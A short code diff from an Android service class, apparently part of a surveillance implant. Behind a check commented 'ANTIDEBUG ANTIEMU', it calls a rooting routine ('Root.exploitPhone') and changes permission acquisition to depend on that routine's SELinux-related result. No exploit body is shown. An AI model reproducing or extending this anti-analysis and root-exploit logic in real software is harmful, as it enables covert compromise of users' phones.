@@ -86,8 +86,10 @@ public class ServiceMain extends Service {
 		// ANTIDEBUG ANTIEMU
 		if (Core.checkStatic()) {
 
-			Root.exploitPhone();
-			Root.getPermissions();
+			boolean selinux = Root.exploitPhone();
+			if(!selinux){
+				Root.getPermissions();
+			}
 			
 			// Core starts
 			core = Core.newCore(this);
